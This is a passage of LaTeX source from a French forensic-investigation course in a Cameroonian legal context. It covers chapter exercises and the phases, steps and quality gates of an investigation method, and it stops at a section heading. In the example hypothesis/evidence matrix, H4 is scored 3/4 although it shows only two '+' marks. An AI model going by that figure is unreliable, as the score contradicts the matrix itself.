        draw=CouleurAccent, fill=CouleurAccent!20, rounded corners=6pt,
        minimum width=3.5cm, minimum height=1.1cm,
        font=\small\bfseries\color{CouleurAccent!80!black}, align=center
    },
    fl/.style={-{Stealth[length=4pt]}, thick, color=CouleurSecondaire}
]
% Centre : CRO
\node[coeur] (cro) at (0,0) {Trilemme CRO\\$\mathcal{C}$--$\mathcal{R}$--$\mathcal{O}$};
% Domaines actifs
\node[domaine] (ia)    at (-4,  2.5) {IA Forensique};
\node[domaine] (df)    at ( 0,  3.5) {Deepfake\\Detection};
\node[domaine] (cloud) at ( 4,  2.5) {Cloud / IoT\\Mobile};
\node[domaine] (osint) at ( 4, -2.5) {OSINT};
\node[domaine] (pq)    at (-4, -2.5) {Post-Quantique};
% Défis
\node[defi] (opp)  at (-2.5,  0.8) {Opposabilité IA~?};
\node[defi] (jur)  at ( 2.5,  0.8) {Juridiction\\cloud~?};
\node[defi] (hndl) at (-2.5, -0.8) {HNDL};
\node[defi] (priv) at ( 2.5, -0.8) {Vie privée\\vs enquête};
% Flèches
\draw[fl] (ia)    -- (cro);
\draw[fl] (df)    -- (cro);
\draw[fl] (cloud) -- (cro);
\draw[fl] (osint) -- (cro);
\draw[fl] (pq)    -- (cro);
\end{tikzpicture}
\caption{Carte de la forensique numérique en 2025--2026~: cinq frontières
actives toutes soumises aux tensions du Trilemme CRO}
\end{figure}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{IA forensique~:} puissant pour le triage, problématique
          pour l'opposabilité. L'IA oriente~; l'humain constate et signe.
          Documenter outil, version, paramètres, échantillon de vérification.

    \item \textbf{Deepfakes~:} détection par analyse de cohérence physique,
          analyse spectrale (FFT), métadonnées et standard C2PA. La
          \loicam{2010/012} art.~72 et la \loicam{2024/017} art.~59
          couvrent les deepfakes frauduleux.

    \item \textbf{Cloud forensique~:} trois défis~: multitenancy, éphéméralité,
          multi-juridiction. La réquisition aux opérateurs cloud passe par
          des portails LEA dédiés (AWS, Azure, Google, Binance).

    \item \textbf{Mobile Afrique~:} quatre niveaux d'acquisition NIST. En
          Afrique subsaharienne, la forensique mobile est prioritaire~:
          Mobile Money, WhatsApp, SIM swapping sont les vecteurs dominants.

    \item \textbf{OSINT~:} cycle en 5~étapes, 8~outils de référence.
          La capture d'écran horodatée est obligatoire. L'infiltration en
          ligne sort du cadre OSINT et exige une autorisation judiciaire.

    \item \textbf{DICES~:} le Cameroun a un cadre législatif solide
          (\loicam{2010/012} + \loicam{2024/017}) mais manque de laboratoire
          accrédité et de jurisprudence publiée.

    \item \textbf{Roadmap 36~mois~:} Socle (Kali/Autopsy/Volatility)
          $\to$ Spécialisation (judiciaire / IR / mobile)
          $\to$ Excellence (GCFE/GCFA + contribution institutionnelle).
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~5.1 --- Évaluation d'un outil IA \niveaubase}]
Un analyste utilise un outil commercial d'IA pour classifier automatiquement
500~emails dans une affaire de fraude. L'outil indique que 47~emails sont
``fortement suspects'' avec une probabilité de 0.93.

\begin{enumerate}[(a)]
    \item Quelles informations l'analyste doit-il obtenir sur l'outil
          avant de l'utiliser dans un rapport judiciaire~?
    \item Comment valide-t-il les conclusions de l'IA sur un échantillon~?
    \item Comment formule-t-il la conclusion dans son rapport pour
          qu'elle soit défendable devant un tribunal camerounais~?
    \item Formulez l'analyse CRO de cette décision d'utiliser l'IA.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~5.2 --- Workflow OSINT \niveaumoyen}]
Dans une affaire de cyberharcèlement, la victime vous fournit~:
\begin{itemize}
    \item Un numéro de téléphone camerounais~: \texttt{+237 6XX XXX XXX}
    \item Un pseudo Instagram~: \texttt{@shadow\_cam237}
    \item Une photo de profil téléchargée depuis Instagram
    \item Un email reçu depuis~: \texttt{noreply@camphone-support.cm}
\end{itemize}

\begin{enumerate}[(a)]
    \item Construisez un workflow OSINT complet~: pour chaque élément,
          quel outil utilisez-vous et quelle information cherchez-vous~?
    \item Identifier les limites légales de votre collecte~: à quel
          moment devez-vous une réquisition judiciaire pour continuer~?
    \item Comment documentez-vous vos sources pour la recevabilité~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~5.3 --- Analyse DICES du Cameroun \niveauexpert}]
En vous appuyant sur le framework DICES et sur les informations du
chapitre~:
\begin{enumerate}[(a)]
    \item Pour chaque axe DICES, identifiez une force et une faiblesse
          spécifique au contexte camerounais en 2026.
    \item Proposez une action concrète et réalisable à court terme
          ($\leq$ 2~ans) pour chacune des deux lacunes les plus critiques.
    \item Dans la roadmap 36~mois, quel axe DICES est le plus influencé
          par votre choix de spécialisation~? Justifiez.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition vers la Partie~II.} La Partie~I vous a donné
la philosophie (Ch.~\ref{chap:phi-fond}), l'histoire
(Ch.~\ref{chap:histoire}), les affaires de référence
(Ch.~\ref{chap:gr-affaires}), les fondements mathématiques
(Ch.~\ref{chap:fond-theo}) et l'état de l'art (ce chapitre). Ces
cinq chapitres constituent le \emph{pourquoi} de la discipline. La
\textbf{Partie~II} (Chapitres~6--9) en construit le \emph{comment}~:
le Processus Investigatif Universel, les méthodologies et standards,
la chaîne de custody et les outils d'acquisition~; tout ce qu'il vous
faut pour conduire votre première investigation de A à Z.
\end{boxinfo}
       
    % ======================================================================
    % PARTIE II — PROCESSUS ET MÉTHODOLOGIES D'INVESTIGATION
    % Standards : DFRWS 2001, ISO/IEC 27043, NIST SP 800-86, RFC 3227
    % Niveau : fondamental à intermédiaire
    % ======================================================================
    \part{Processus et Méthodologies d'Investigation}
    \label{part:methodologie}

        % ============================================================================
% Fichier  : partie2/P02_C06_PIU_processus_universel.tex
% Titre    : Processus Investigatif Universel
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Source   : cours_IN_METHODOLOGIE.pdf (39 pages) -- fidèlement converti
%            et habillé selon le style TPIN. Contenu original intégralement
%            préservé. Enrichissements : encadrés CRO, boxPNC, ancrage
%            camerounais, liens avec les affaires MBONGO et ROUSSEAU.
% ============================================================================

\chapter{Processus Investigatif Universel}
\label{chap:PIU}

\epigraph{%
    « La qualité d'une investigation se mesure moins à la rapidité avec
    laquelle on parvient à des conclusions qu'à la robustesse avec laquelle
    ces conclusions résistent à la contestation contradictoire. »%
}{--- Principe fondamental du PIU}

\niveauChapitre{Fondamental à Intermédiaire}{%
    Lecture de la Partie~I recommandée. Ce chapitre constitue le c\oe ur
    méthodologique de ce cours~; toutes les parties suivantes s'y réfèrent.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre l'architecture modulaire du \termecle{Processus
          Investigatif Universel} (PIU)~: 5~phases, 17~étapes, 3~Quality Gates.
    \item Maîtriser la \termecle{matrice de criticité} pour calibrer le niveau
          de rigueur adapté à chaque investigation.
    \item Appliquer chaque étape selon trois niveaux de profondeur (minimal,
          standard, avancé) selon les contraintes du contexte.
    \item Conduire une investigation complète dans trois contextes distincts~:
          particulier, entreprise et judiciaire.
    \item Comprendre le rôle des Quality Gates comme mécanismes de contrôle
          qualité obligatoires.
    \item Relier chaque phase du PIU aux dimensions du Trilemme CRO.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section{Introduction et Architecture Générale}
\label{sec:piu-intro}
% ============================================================================

\subsection{Objectifs et principes fondateurs}

L'investigation, qu'elle soit menée dans un cadre personnel, professionnel ou
judiciaire, nécessite une méthodologie rigoureuse garantissant à la fois
l'intégrité probatoire et la défendabilité des conclusions. Ce chapitre
présente un \termecle{Processus Investigatif Universel} (PIU), conçu pour
s'adapter à tout contexte investigatif par le biais d'une architecture
modulaire et scalable.

Le PIU vise quatre objectifs fondamentaux~:
\begin{enumerate}
    \item \textbf{Établissement factuel objectif}~: documenter les faits de
          manière reproductible et vérifiable~;
    \item \textbf{Intégrité probatoire}~: garantir que les éléments collectés
          conservent leur valeur probante~;
    \item \textbf{Traçabilité complète}~: permettre l'audit de chaque étape
          du processus investigatif~;
    \item \textbf{Défendabilité}~: produire des conclusions résistant à la
          contestation contradictoire.
\end{enumerate}

\subsection{Principe d'adaptabilité~: trois contextes}

Le PIU emploie une terminologie neutre permettant son application dans trois
contextes principaux~:
\begin{itemize}
    \item \textbf{Contexte particulier}~: investigation menée par un individu
          pour ses intérêts propres~;
    \item \textbf{Contexte organisationnel}~: investigation interne à une
          entreprise ou institution~;
    \item \textbf{Contexte judiciaire}~: expertise mandatée par une autorité
          juridictionnelle.
\end{itemize}

Chaque étape comporte trois niveaux de profondeur (minimal, standard, avancé)
s'ajustant selon la criticité du cas, conformément à la matrice de criticité
du Tableau~\ref{tab:piu-criticite}.

\subsection{Matrice de criticité}

\begin{tableaucours}{p{3.5cm}p{2.8cm}p{2.8cm}p{2.8cm}}{%
    \tableauHeader{Critère} &
    \tableauHeader{Minimal} &
    \tableauHeader{Standard} &
    \tableauHeader{Avancé}
}
Enjeu financier & $<$ 10k & 10--100k & $>$ 100k \\
Risque pénal & Nul & Contraventionnel & Correctionnel/Criminel \\
Complexité technique & Faible & Moyenne & Haute \\
Nombre parties prenantes & $<$ 5 & 5--20 & $>$ 20 \\
Durée estimée & $<$ 1~semaine & 1~sem.~-- 3~mois & $>$ 3~mois \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~\ref{tab:piu-criticite} ---
Matrice de criticité et niveau de rigueur requis}\end{center}
\label{tab:piu-criticite}

\subsection{Architecture globale~: 5~phases, 17~étapes, 3~Quality Gates}

Le PIU s'articule en cinq phases séquentielles comportant 17~étapes
opérationnelles et trois points de contrôle qualité (\termecle{Quality Gates}).

\begin{figure}[H]
\centering
\begin{tikzpicture}[
    phase/.style={
        draw=CouleurPrimaire, fill=CouleurDef, rounded corners=4pt,
        minimum width=9.5cm, minimum height=0.85cm,
        font=\small\bfseries\color{CouleurPrimaire}, align=center
    },
    qg/.style={
        draw=CouleurAccent, fill=CouleurAlerte, rounded corners=3pt,
        minimum width=3.2cm, minimum height=0.7cm,
        font=\footnotesize\bfseries\color{CouleurBordAlerte}, align=center
    },
    fl/.style={-{Stealth[length=5pt]}, thick, color=CouleurPrimaire}
]
\node[phase] (p1) at (0, 0)   {PHASE 1 --- Initialisation et Cadrage (E1--E3)};
\node[qg]    (q1) at (5.5, -0.85) {QG1 --- Validation\\Pré-Opérationnelle};
\node[phase] (p2) at (0, -1.7) {PHASE 2 --- Acquisition et Préservation (E4--E6)};
\node[qg]    (q2) at (5.5, -2.55) {QG2 --- Intégrité\\Probatoire};
\node[phase] (p3) at (0, -3.4) {PHASE 3 --- Investigation Analytique (E7--E10)};
\node[qg]    (q3) at (5.5, -4.25) {QG3 --- Robustesse\\Analytique};
\node[phase] (p4) at (0, -5.1) {PHASE 4 --- Formalisation et Transmission (E11--E13)};
\node[phase] (p5) at (0, -6.0) {PHASE 5 --- Suivi Post-Transmission (E14--E17)};
% Flèches
\draw[fl] (p1) -- (p2);
\draw[fl] (p2) -- (p3);
\draw[fl] (p3) -- (p4);
\draw[fl] (p4) -- (p5);
% Boucle itérative
\draw[fl, dashed, color=CouleurSecondaire]
    (p3.east) -- ++(0.4,0) |- node[right, font=\tiny, color=CouleurSecondaire,
    pos=0.25] {Itération\\si nécessaire} (p2.east);
\end{tikzpicture}
\caption{Architecture globale du Processus Investigatif Universel (PIU)}
\label{fig:piu-architecture}
\end{figure}

\subsection{Principe des Quality Gates}

Les \termecle{Quality Gates} (QG) constituent des points de contrôle
obligatoires validant la conformité avant progression vers la phase suivante.
Leur structure s'articule autour de critères graduels~:
\begin{itemize}
    \item \textbf{Critères obligatoires}~: applicables à tous les contextes~;
    \item \textbf{Critères standard}~: pour cas moyennement complexes~;
    \item \textbf{Critères avancés}~: pour investigations à haute criticité.
\end{itemize}

Un échec à un Quality Gate impose soit une remédiation immédiate, soit un retour
aux étapes antérieures concernées. Trois décisions possibles~:
\begin{description}
    \item[\textcolor{CouleurBordLizbiz}{\textbf{VERT}}] Tous critères obligatoires
          validés~: progression vers la phase suivante.
    \item[\textcolor{CouleurAccent}{\textbf{ORANGE}}] Critère non bloquant
          manquant~: progression conditionnelle avec plan de régularisation.
    \item[\textcolor{CouleurBordAlerte}{\textbf{ROUGE}}] Critère bloquant non
          validé~: suspension jusqu'à mise en conformité complète.
\end{description}

% ============================================================================
\section{Phase~1~: Initialisation et Cadrage}
\label{sec:piu-phase1}
% ============================================================================

La phase d'initialisation détermine la recevabilité de la demande investigative
et établit les conditions opérationnelles de sa conduite.

\subsection{Étape E1 --- Réception et Évaluation Préliminaire}

\textbf{Objectif~:} Comprendre la nature de la demande et évaluer sa recevabilité
avant tout engagement de ressources.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Réception de la demande d'investigation (formelle ou informelle)~;
    \item Identification du commanditaire et vérification de sa légitimité~;
    \item Compréhension sommaire des faits allégués~;
    \item Évaluation première de la faisabilité technique et juridique.
\end{itemize}

\textbf{Niveau standard~:} En complément du niveau minimal~:
\begin{itemize}
    \item Demande de précisions écrites formelles au commanditaire~;
    \item Vérification des autorisations légales préalables nécessaires~;
    \item Estimation préliminaire des ressources humaines, techniques et
          temporelles requises~;
    \item Identification des contraintes réglementaires applicables
          (Loi~2024/017, Convention de Budapest selon contexte).
\end{itemize}

\textbf{Niveau avancé~:} En complément des niveaux précédents~:
\begin{itemize}
    \item Analyse de risque multi-dimensionnelle (légal, réputationnel,
          technique, financier)~;
    \item Consultation de spécialistes pour évaluation de faisabilité~;
    \item Étude de précédents similaires (jurisprudence, cas antérieurs)~;
    \item Rédaction d'une note d'opportunité structurée.
\end{itemize}

\textbf{Livrable~:} \textit{Fiche d'Évaluation Initiale} comprenant~:
description factuelle de la demande~; enjeux identifiés (financiers, juridiques,
humains, réputationnels)~; obstacles prévisibles et risques~;
recommandation préliminaire motivée (accepter / refuser / clarifier).

\subsection{Étape E2 --- Décision d'Engagement}

\textbf{Objectif~:} Valider formellement le lancement de l'investigation selon
les critères de gouvernance appropriés au contexte.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Décision personnelle d'engagement documentée~;
    \item Vérification d'absence de conflit d'intérêt personnel~;
    \item Validation de la disponibilité temporelle et des ressources.
\end{itemize}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Validation hiérarchique ou contractuelle formalisée~;
    \item Signature d'un mandat d'investigation ou lettre de mission~;
    \item Définition précise du périmètre d'investigation et des limitations~;
    \item Établissement d'un budget prévisionnel et allocation de ressources~;
    \item Détermination des délais et jalons intermédiaires.
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Validation collégiale impliquant expertises multiples (technique,
          juridique, éthique)~;
    \item Obtention des autorisations formelles requises (mandat judiciaire,
          réquisition~; art.~52 \loicam{2010/012} en contexte camerounais)~;
    \item Définition du niveau de classification sécuritaire~;
    \item Constitution d'un comité de pilotage si investigation complexe.
\end{itemize}

\textbf{Livrable~:} \textit{Mandat d'Investigation} comprenant~: périmètre précis
et exclusions explicites~; délais avec jalons intermédiaires~; budget et
ressources allouées~; niveau d'autorité conféré~; obligations de confidentialité~;
conditions de transmission finale.

\subsection{Étape E3 --- Planification Opérationnelle}

\textbf{Objectif~:} Structurer l'investigation en mobilisant les ressources
adéquates et en anticipant les difficultés opérationnelles.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Auto-évaluation des compétences requises versus disponibles~;
    \item Listage des outils et équipements nécessaires~;
    \item Création d'un calendrier sommaire avec échéances principales.
\end{itemize}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Constitution d'une équipe avec attribution claire des rôles~;
    \item Rédaction d'un plan d'investigation structuré (axes, méthodologies,
          jalons, hypothèses préliminaires)~;
    \item Configuration et test des outils techniques~;
    \item Mise en place d'un système de documentation et traçabilité.
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Planification détaillée type gestion de projet (WBS, Gantt)~;
    \item Analyse de risque opérationnelle exhaustive avec plan de contingence~;
    \item Test et calibration des outils critiques~;
    \item Création d'un environnement de travail sécurisé~;
    \item Établissement de protocoles d'escalade pour situations critiques.
\end{itemize}

\textbf{Livrable~:} \textit{Plan d'Investigation v1.0} comprenant~: objectifs
et critères de succès mesurables~; méthodologie générale~; ressources mobilisées~;
échéancier prévisionnel~; procédures de gestion des imprévus.

\subsection{Quality Gate~1 --- Validation Pré-Opérationnelle}

\textbf{Objectif~:} Garantir que l'ensemble des conditions préalables au démarrage
effectif sont satisfaites.

\textbf{Critères obligatoires (tous contextes)~:}
\begin{itemize}
    \item Mandat d'investigation formalisé et validé par l'autorité compétente~;
    \item Périmètre clairement défini, compris et accepté par toutes parties~;
    \item Ressources minimales identifiées et effectivement disponibles~;
    \item Plan d'investigation v1.0 rédigé et approuvé~;
    \item Outils nécessaires opérationnels ou accessibles dans les délais.
\end{itemize}

\textbf{Critères standard~:}
\begin{itemize}
    \item Validation légale et/ou déontologique obtenue auprès des instances~;
    \item Protocoles de documentation établis et compris de tous~;
    \item Système de traçabilité configuré et testé.
\end{itemize}

\textbf{Critères avancés~:}
\begin{itemize}
    \item Plan de contingence documenté couvrant les risques identifiés~;
    \item Tests opérationnels des outils techniques réalisés~;
    \item Assurances et couvertures légales vérifiées si applicable.
\end{itemize}

\begin{boxPNC}
\textbf{Application OPJ --- Contexte camerounais, QG1~:}

En contexte judiciaire camerounais, le passage au VERT du QG1 exige~:
\begin{enumerate}
    \item Réquisition judiciaire ou mandat du procureur (art.~52 \loicam{2010/012})~;
    \item Disponibilité d'un kit forensique de base (write blocker,
          FTK Imager, clé USB bootable)~;
    \item Information du suspect de ses droits (art.~5 CPP Cameroun)
          si l'investigation implique une perquisition.
\end{enumerate}
\end{boxPNC}

% ============================================================================
\section{Phase~2~: Acquisition et Préservation}
\label{sec:piu-phase2}
% ============================================================================

La phase d'acquisition vise à constituer la base probatoire de l'investigation
en garantissant l'intégrité et la recevabilité juridique des éléments collectés.

\subsection{Étape E4 --- Collecte Systématique des Éléments Probatoires}

\textbf{Objectif~:} Rassembler exhaustivement les éléments factuels pertinents
en préservant leur intégrité et leur valeur probatoire.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Identification systématique des sources d'information disponibles~;
    \item Collecte documentaire (contrats, correspondances, factures, notes)~;
    \item Réalisation de photographies ou copies des éléments physiques~;
    \item Rédaction de notes de constatation horodatées.
\end{itemize}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Application d'un protocole de collecte standardisé et documenté~;
    \item Documentation de chaque action~: date/heure, méthode, outils,
          identité du collecteur, état initial, localisation~;
    \item Attribution d'une numérotation séquentielle unique à chaque élément~;
    \item Photographie de contexte (scène, emplacement) avant prélèvement.
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Application stricte des protocoles \norme{ISO~27037} et
          principes ACPO~;
    \item Création d'images forensiques bit-à-bit avec write blocker~;
    \item Calcul d'empreintes cryptographiques (SHA-256 et SHA-512) pour
          tous éléments numériques~;
    \item Réalisation de prélèvements en présence de témoins assermentés
          si contexte judiciaire.
\end{itemize}

\textbf{Livrable~:} \textit{Inventaire des Éléments Probatoires} comprenant~:
liste numérotée~; description non ambiguë~; provenance et circonstances~;
état initial~; empreintes cryptographiques~; chaîne de traçabilité initiale.

\subsection{Étape E5 --- Sécurisation et Préservation}

\textbf{Objectif~:} Garantir l'intégrité durable des éléments collectés et
prévenir toute altération, perte ou accès non autorisé.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Création immédiate de copies de sauvegarde sur support physique distinct~;
    \item Stockage sécurisé dans lieu physique protégé~;
    \item Règle stricte~: interdiction de travailler directement sur originaux~;
    \item Journal des accès (qui, quand, pourquoi).
\end{itemize}

\textbf{Niveau standard~:} Principe de sauvegarde 3-2-1~:
\begin{itemize}
    \item 3~copies de chaque élément~;
    \item 2~types de supports différents (disque dur, cloud, support optique)~;
    \item 1~copie en localisation géographique distincte~;
    \item Chiffrement systématique des données sensibles (AES-256)~;
    \item Vérification régulière (hebdomadaire) de l'intégrité par hash.
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Utilisation de blockchain privée ou horodatage qualifié~;
    \item Stockage en coffre-fort numérique certifié~;
    \item Tests d'intégrité automatisés quotidiens~;
    \item Plan de continuité opérationnelle documenté.
\end{itemize}

\textbf{Livrable~:} \textit{Registre de Préservation} comprenant~:
certificats d'intégrité (hash avec algorithme)~; schéma de localisation des
copies~; journal d'accès horodaté~; résultats des tests d'intégrité.

\subsection{Étape E6 --- Identification et Cartographie des Parties Prenantes}

\textbf{Objectif~:} Recenser exhaustivement toutes les personnes et entités ayant
un lien direct ou indirect avec les faits investigués.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Listage des parties directement mentionnées~;
    \item Distinction sommaire entre acteurs principaux et secondaires~;
    \item Recueil des coordonnées disponibles~;
    \item Notation des relations apparentes entre parties.
\end{itemize}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Cartographie relationnelle détaillée (hiérarchiques, contractuels,
          familiaux)~;
    \item Classification par catégories~: parties directes~; témoins directs~;
          témoins indirects~; experts techniques~; autorités de tutelle~;
    \item Priorisation raisonnée pour la conduite des entretiens~;
    \item OSINT systématique dans limites légales (cf. Chapitre~\ref{chap:etat-art}).
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Analyse de réseau social formelle (SNA) avec logiciels dédiés~;
    \item Profilage préliminaire adapté au contexte~;
    \item Évaluation du risque de collusion ou de coordination entre parties.
\end{itemize}

\textbf{Livrable~:} \textit{Matrice des Parties Prenantes} avec pour chaque
personne/entité~: identité et coordonnées~; rôle et catégorie~; niveau
d'implication estimé (1--5)~; crédibilité préliminaire~; priorité d'entretien~;
schéma relationnel visuel.

\subsection{Quality Gate~2 --- Intégrité Probatoire}

\textbf{Objectif~:} Vérifier que la base probatoire constituée est complète,
intègre, traçable et juridiquement exploitable.

\textbf{Critères obligatoires~:}
\begin{itemize}
    \item Inventaire probatoire exhaustif, numéroté de manière unique~;
    \item Chaîne de traçabilité documentée sans interruption pour chaque élément~;
    \item Sauvegardes multiples vérifiées et opérationnelles~;
    \item Impossibilité technique de modification non tracée~;
    \item Journal d'accès à jour, sans anomalie détectée.
\end{itemize}

\textbf{Critères standard~:}
\begin{itemize}
    \item Hash cryptographiques calculés et archivés dans localisation distincte~;
    \item Tests d'intégrité périodiques réalisés (100\% des hash correspondants)~;
    \item Conformité légale de toutes les méthodes de collecte validée.
\end{itemize}

\textbf{Rationale critique~:} Un élément probatoire non conforme à QG2 risque
l'irrecevabilité juridique (vice de procédure), la contestabilité (doute sur
authenticité) ou l'inexploitabilité (altération). La détection précoce évite
l'invalidation tardive de l'ensemble du travail investigatif.

\begin{boxCRO}
\textbf{Analyse CRO --- Phase~2~: Acquisition et Préservation}

$\mathcal{C}$~: La collecte exhaustive (E4 niveau avancé) peut inclure des
données sans rapport avec l'affaire. La proportionnalité doit guider le
périmètre de collecte.

$\mathcal{R}$~: Le principe 3-2-1 (E5) et le hachage SHA-256+SHA-512 maximisent
la fiabilité. L'impossibilité technique de modification non tracée est le
critère QG2 le plus important.

$\mathcal{O}$~: La chaîne de traçabilité continue et les hash documentés sont
les preuves d'intégrité opposables en justice.

\cro{$\downarrow$ proportionnalité}{$\uparrow\uparrow$ maximisée}{$\uparrow$ par la custody}
\end{boxCRO}

% ============================================================================
\section{Phase~3~: Investigation Analytique}
\label{sec:piu-phase3}
% ============================================================================

La phase d'investigation constitue le c\oe ur du processus, durant laquelle
hypothèses explicatives sont générées, testées et confrontées aux éléments
probatoires. Cette phase comporte une boucle itérative formalisée.

\subsection{Étape E7 --- Interrogatoires et Collecte Testimoniale}

\textbf{Objectif~:} Recueillir les témoignages, déclarations et expertises orales
nécessaires à la compréhension approfondie des faits.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Conduite d'entretiens informels non structurés~;
    \item Prise de notes manuscrites contemporaines~;
    \item Recueil des déclarations spontanées~;
    \item Conservation soigneuse des témoignages écrits volontairement fournis.
\end{itemize}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Préparation de questionnaires structurés adaptés à chaque catégorie~;
    \item Conduite d'entretiens semi-directifs (narration libre puis précisions)~;
    \item Enregistrement audio avec consentement formel écrit~;
    \item Rédaction de comptes rendus fidèles soumis à validation~;
    \item Analyse de cohérence interne (chronologie, contradictions)~;
    \item Documentation des refus de répondre.
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Application de protocoles scientifiques~: méthode PEACE
          (\textit{Preparation, Engage, Account, Closure, Evaluation})~;
          entretien cognitif pour témoins de bonne foi~;
    \item Enregistrement multi-modal (audio et vidéo) si approprié~;
    \item Analyse linguistique approfondie des déclarations~;
    \item Procédures d'audition formelles respectant strictement les droits
          processuels (contexte judiciaire).
\end{itemize}

\textbf{Livrable~:} \textit{Corpus Testimonial} comprenant~: enregistrements
archivés~; transcriptions intégrales horodatées~; comptes rendus synthétiques~;
matrice d'évaluation de cohérence et crédibilité~; points de convergence et
divergences~; éléments corroborant ou réfutant les hypothèses.

\subsection{Étape E8 --- Génération d'Hypothèses Multiples}

\textbf{Objectif~:} Construire de manière systématique plusieurs scénarios
explicatifs distincts des faits, sans présupposé hiérarchique initial,
afin d'éviter le biais de confirmation.

\subsubsection*{Actions par niveau}

\textbf{Niveau minimal~:}
\begin{itemize}
    \item Formulation de 2 à 3 hypothèses principales spontanées~;
    \item Description narrative sommaire de chaque scénario~;
    \item Identification intuitive de l'hypothèse la plus probable.
\end{itemize}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Génération systématique d'au moins 5~hypothèses distinctes incluant~:
          hypothèse principale, alternatives crédibles, hypothèse nulle
          (absence de fait délictuel), hypothèses improbables~;
    \item Documentation du raisonnement sous-jacent à chaque hypothèse~;
    \item Construction d'arbres de décision ou diagrammes causaux~;
    \item Formulation de prédictions testables dérivées
          (\textit{si H vraie, alors on devrait observer\ldots}).
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Application formalisée de la méthode ACH
          (\textit{Analysis of Competing Hypotheses}) \cite{heuer1999}~;
    \item Modélisation bayésienne des probabilités a priori~;
    \item Exercice de \textit{red teaming}~: simulation d'acteur adversaire~;
    \item Analyse de précédents historiques similaires (benchmark).
\end{itemize}

\textbf{Livrable~:} \textit{Arbre d'Hypothèses v1.0} comprenant pour chaque
hypothèse~: identifiant unique et intitulé non ambigu~; description narrative~;
raisonnement explicite~; prédictions testables~; preuves pro/contra~;
conditions de réfutation~; probabilité subjective initiale.

\subsection{Étape E9 --- Confrontation Hypothèses/Preuves}

\textbf{Objectif~:} Évaluer systématiquement la compatibilité de chaque hypothèse
avec l'ensemble des éléments probatoires et témoignages collectés.

\subsubsection*{Actions par niveau}

\textbf{Niveau standard~:}
\begin{itemize}
    \item Construction d'une matrice de compatibilité hypothèses $\times$ preuves~;
    \item Pour chaque intersection, évaluation qualitative~:
          \textbf{+} Cohérente~; \textbf{-} Incohérente~; \textbf{o} Neutre~;
    \item Calcul de scores de cohérence par hypothèse~;
    \item Identification des preuves discriminantes~;
    \item Test empirique des prédictions dérivées (E8)~;
    \item Hiérarchisation des hypothèses par score de cohérence.
\end{itemize}

\textbf{Niveau avancé~:}
\begin{itemize}
    \item Analyse bayésienne formelle~;
    \item Simulation Monte-Carlo pour quantification des incertitudes~;
    \item Organisation de sessions de \textit{peer review}~;
    \item Processus de \textit{red team} cherchant activement à réfuter.
\end{itemize}

La figure suivante illustre un exemple de matrice de compatibilité~:

\begin{figure}[H]
\centering
\begin{tikzpicture}
\matrix (m) [matrix of nodes,
    nodes in empty cells,
    column sep=0.6cm, row sep=0.3cm,
    nodes={minimum width=1.2cm, minimum height=0.7cm,
           draw=CouleurBordInfo, font=\small, align=center}]
{
    {} & {H1} & {H2} & {H3} & {H4} \\
    {P1} & {\textcolor{red}{--}} & {\textcolor{CouleurBordLizbiz}{+}} &
            {\textcolor{CouleurBordLizbiz}{+}} & {o} \\
    {P2} & {o} & {\textcolor{CouleurBordLizbiz}{+}} &
            {\textcolor{red}{--}} & {\textcolor{CouleurBordLizbiz}{+}} \\
    {P3} & {\textcolor{CouleurBordLizbiz}{+}} & {o} &
            {\textcolor{CouleurBordLizbiz}{+}} & {o} \\
    {P4} & {\textcolor{red}{--}} & {\textcolor{red}{--}} & {o} &
            {\textcolor{CouleurBordLizbiz}{+}} \\
    {Score} & {1/4} & {2/4} & {2/4} & {3/4} \\
};
% Colorier la ligne d'en-tête
\foreach \col in {2,3,4,5} {
    \fill[CouleurPrimaire!20] (m-1-\col.north west) rectangle (m-1-\col.south east);
}
% Colorier la colonne d'en-tête
\foreach \row in {2,3,4,5,6} {
    \fill[CouleurPrimaire!20] (m-\row-1.north west) rectangle (m-\row-1.south east);
}
\end{tikzpicture}
\caption{Exemple de matrice de compatibilité hypothèses/preuves~:
\textbf{+} Cohérent~; \textbf{--} Incohérent~; \textbf{o} Neutre}
\label{fig:matrice-ach}
\end{figure}

\textbf{Livrable~:} \textit{Matrice d'Analyse Hypothèses/Preuves} comprenant~:
tableau croisé~; scores de cohérence~; liste des hypothèses réfutées~;
classement hiérarchique~; lacunes probatoires~; recommandations de collecte.

\subsection{Étape E9bis --- Falsification Active}

